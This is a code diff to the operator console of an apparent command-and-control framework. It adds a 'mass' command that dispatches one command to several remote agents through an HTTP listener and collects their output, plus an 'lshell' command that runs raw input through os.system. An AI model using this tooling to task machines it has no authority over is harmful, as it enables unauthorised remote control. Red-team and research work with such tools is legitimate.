@@ -20,7 +20,14 @@ server_command = {
     "rename": f"{CYAN}Rename an agent by selecting its index and pass a non empty string{RESET}",
     "uuid2name": f"{CYAN}Translate uuid to agent name. Usage: {RESET}'uuid2name <UUID>'",
     "name2uuid": f"{CYAN}Translate agent name to uuid. Usage: {RESET}'name2uuid <name>'",
+    "lshell": f"{CYAN}Execute bash commands on the local server. Usage: {RESET} 'lshell <bash command>'",
+    "mass": f"{CYAN}Select agent indexs (separated by spaces) and send a command to all of them. Usage: {RESET} 'mass <command>'"
 }
+
+null_output = [
+    "sleep",
+    "exit",
+]
 
 # Create the agents.db file and table if it's not already created in the Listeners/http/ directory.
 script_dir = os.path.dirname(os.path.abspath(__file__))
@@ -31,7 +38,7 @@ if not os.path.exists(db_path):
 
     cur.execute('''CREATE TABLE IF NOT EXISTS agents (
         uuid TEXT PRIMARY KEY,
-        name TEXT,
+        name TEXT NOT NULL UNIQUE,
         status TEXT,
         first_seen TIMESTAMP,
         last_seen TIMESTAMP,
@@ -44,6 +51,7 @@ if not os.path.exists(db_path):
 
 # Connect to redis database. Redis stores Agent commands
 r = redis.Redis(host="127.0.0.1", port=6379, db=0, decode_responses=True)
+url = f"http://127.0.0.1:8000/admin" # change later to proper port/ip/domain name
 
 header = {"Content-Type": "application/json"}
 
@@ -64,10 +72,11 @@ def print_table():
     INDEX_WIDTH = 7
     NAME_WIDTH = 25
     STATUS_WIDTH = 8
+    PROFILE_WIDTH = 15
     # Add length of new columns here. Future implement: IP column
-    total_width = INDEX_WIDTH + NAME_WIDTH + STATUS_WIDTH + 10
+    total_width = INDEX_WIDTH + NAME_WIDTH + STATUS_WIDTH + PROFILE_WIDTH + 13
     print('=' * total_width)
-    print(f'| {"Index":^{INDEX_WIDTH}} | {"Agent Name":^{NAME_WIDTH}} | {"Status":^{STATUS_WIDTH}} |') # Print column headers and centers them. 
+    print(f'| {"Index":^{INDEX_WIDTH}} | {"Agent Name":^{NAME_WIDTH}} | {"Profile":^{PROFILE_WIDTH}} | {"Status":^{STATUS_WIDTH}} |') # Print column headers and centers them. 
     print('=' * total_width)
 
     # print the table
@@ -75,19 +84,20 @@ def print_table():
         status = row[2]
         index_cell = str(index).center(INDEX_WIDTH)
         name_cell = row[1].center(NAME_WIDTH)
+        profile_cell = row[3].center(PROFILE_WIDTH)
         status_cell = row[2].center(STATUS_WIDTH)
         if status == "DEAD":
-            print(f"| {index_cell} | {CYAN}{name_cell}{RESET} | {RED}{status_cell}{RESET} |")
+            print(f"| {index_cell} | {CYAN}{name_cell}{RESET} | {CYAN}{profile_cell}{RESET} | {RED}{status_cell}{RESET} |")
         elif status == "ALIVE":
-            print(f"| {index_cell} | {CYAN}{name_cell}{RESET} | {GREEN}{status_cell}{RESET} |")
+            print(f"| {index_cell} | {CYAN}{name_cell}{RESET} | {CYAN}{profile_cell}{RESET} | {GREEN}{status_cell}{RESET} |")
         else:
-            print(f"| {index_cell} | {CYAN}{name_cell}{RESET} | {status_cell} |")
+            print(f"| {index_cell} | {CYAN}{name_cell}{RESET} | {CYAN}{profile_cell}{RESET} | {status_cell} |")
         print('-' * total_width)
 
     return result
 
 # Sends agent commands to the Gunicorn/flask app HTTP listener at /admin
-def send_cmd(url, cmd):
+def send_cmd(cmd):
     if os.getenv('UUID'):
         id = os.getenv('UUID')
     else:
@@ -102,9 +112,7 @@ def send_cmd(url, cmd):
         return
     
     raw_cmd = cmd.split(" ", 1) # get the command (first word)
-    if raw_cmd[0] == "exit":
-        return
-    elif raw_cmd[0] == "sleep":
+    if raw_cmd[0] in null_output:
         return
     elif response.status_code == 200:
         key = f"{os.getenv('UUID')}-output"
@@ -133,7 +141,7 @@ def agents(*agrs):
     os.environ['PROFILE'] = result[agent_index][3]
 
 # Grab uuid stored in environmental variable
-def uuid(*args):
+def uuid(*bruh):
     id = os.getenv('UUID')
     print(f"{CYAN}Current UUID: {RESET}{id}")
 
@@ -154,7 +162,7 @@ def history(length):
         print(f'{i}) {hist[i]}')
 
 
-def clear(*args):
+def clear(bruh):
     os.system("clear")
 
 
@@ -162,8 +170,6 @@ def delete(name):
     if name: # Delete by agent name provided
         conn = sqlite3.connect(db_path)
         cur = conn.cursor()
-        cur.execute("SELECT uuid FROM agents where name = ?", (name,)) # translate name to uuid + used for logic check
-        uuid = cur.fetchone()
         cur.execute("DELETE FROM agents WHERE name = ?", (name,))
         conn.commit()
         conn.close()
@@ -204,21 +210,27 @@ def rename(name):
             return
         
     except ValueError:
-        print(f"{RED}ERROR: Input must be a number {RESET}")
+        print(f"{RED}ERROR: Input must be a number{RESET}")
         return
-    conn = sqlite3.connect(db_path)
-    cur = conn.cursor()
-    uuid = result[agent_index][0]
-    sql_update = "UPDATE agents SET name = ? WHERE uuid = ?" # Update database
-    cur.execute(sql_update, (new_name, uuid))
-    conn.commit()
-    conn.close()
+
+    try: 
+        conn = sqlite3.connect(db_path)
+        cur = conn.cursor()
+        uuid = result[agent_index][0] # result is from print_table()
+        sql_update = "UPDATE agents SET name = ? WHERE uuid = ?" # Update database
+        cur.execute(sql_update, (new_name, uuid))
+        conn.commit()
+        conn.close()
+    except:
+        print(f"{RED}ERROR: Name already exists{RESET}")
+        return
 
 
 def help(cmd):
-    if cmd:
-        if cmd in server_command:
-            print(server_command[cmd])  # Print command description from server_command dictionary at the top
+    command = cmd.split(" ", 1)
+    if command[0]:
+        if command[0] in server_command:
+            print(server_command[command[0]])  # Print command description from server_command dictionary at the top
         elif os.getenv('PROFILE'):
             script_dir = os.path.dirname(os.path.abspath(__file__)) #Open Agent's commands.yaml file to find and list command descriptions
             profile_path = os.path.join(script_dir, '..', 'Agent_Profiles')
@@ -226,7 +238,7 @@ def help(cmd):
             with open(command_config, 'r') as file:
                 config = yaml.safe_load(file)
             command_list = config.get('help', {})
-            tmp = command_list.get(cmd)
+            tmp = command_list.get(command[0])
             if tmp:
                 print(f"{CYAN}{tmp}{RESET}")
         else:
@@ -253,7 +265,10 @@ def uuid2name(uuid):
     cur.execute("SELECT name FROM agents WHERE uuid = ?", (uuid,))
     name = cur.fetchone()
     conn.close()
-    print(f"{CYAN}Name: {RESET}{name}")
+    if name:
+        print(f"{CYAN}Name: {RESET}{name[0]}")
+    else:
+        print(f"{RED}ERROR: UUID not found{RESET}")
 
 # translate agent name to uuid. 
 def name2uuid(name):
@@ -262,4 +277,51 @@ def name2uuid(name):
     cur.execute("SELECT uuid FROM agents WHERE name = ?", (name,))
     uuid = cur.fetchone()
     conn.close()
-    print(f"{CYAN}UUID: {RESET}{uuid}")
+    if uuid:
+        print(f"{CYAN}UUID: {RESET}{uuid[0]}")
+    else:
+        print(f"{RED}ERROR: Name not found{RESET}")
+
+
+def mass(bruh):
+    result = print_table()
+    agent_index = list(map(int, input(f"{CYAN}Select Agent indexes separated by spaces: {RESET}").split()))
+    command = input(f"{CYAN}Command to send to Agents: {RESET}")
+    output_keys = {}
+
+    for i in range(len(agent_index)):
+        uuid = result[agent_index[i]][0]
+        name = result[agent_index[i]][1]
+        try:
+            json_payload = {"uuid": uuid, "command": command}
+            response = requests.post(url, json=json_payload, headers=header)
+        except:
+            print(f"{RED}ERROR: Failed to send. Is HTTP Listener running?{RESET}")
+            return
+        output_keys[name] = f"{uuid}-output"
+
+    # handles commands that don't return outputs. 
+    cmd = command.split(" ", 1)
+    if cmd[0] in null_output:
+        return
+
+    while True:
+        remove = []
+        for name, key in output_keys.items():
+            if r.exists(key):
+                output = r.rpop(key)
+                print(f"{GREEN}{name}:\n{RESET}{output}\n")
+                remove.append(name)
+
+        for name in remove:
+            del output_keys[name]
+
+        if not output_keys:
+            print(f"{CYAN}=============== All Output Received ==============={RESET}")
+            break
+
+        time.sleep(1)
+
+
+def lshell(command):
+    os.system(command)
